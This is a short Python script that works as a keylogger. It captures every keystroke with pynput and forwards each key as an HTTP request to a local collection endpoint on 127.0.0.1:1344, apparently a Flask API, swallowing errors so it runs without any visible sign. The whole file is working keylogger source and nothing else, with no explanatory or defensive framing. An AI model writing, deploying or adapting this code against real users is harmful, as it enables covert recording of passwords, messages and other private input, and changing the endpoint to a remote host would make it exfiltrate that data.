from pynput import keyboard
from multiprocessing import Process, Queue
import requests
import time

API_URL = "http://127.0.0.1:1344"

def send_keystrokes(key_queue):
    """Sends keystrokes from queue to Flask API."""
    while True:
        try:
            keystroke = key_queue.get()
            if keystroke:
                requests.get(f"{API_URL}/{keystroke}")
        except Exception:
            pass  # Fail silently to avoid crashing

def on_press(key, key_queue):
    try:
        key_queue.put(str(key.char))  
    except AttributeError:
        key_queue.put(f"<{key}>")

def logger(key_queue):
    with keyboard.Listener(on_press=lambda key: on_press(key, key_queue)) as listener:
        listener.join()

if __name__ == "__main__":
    key_queue = Queue()
    process = Process(target=send_keystrokes, args=(key_queue,), daemon=True)
    process.start()
    logger(key_queue)
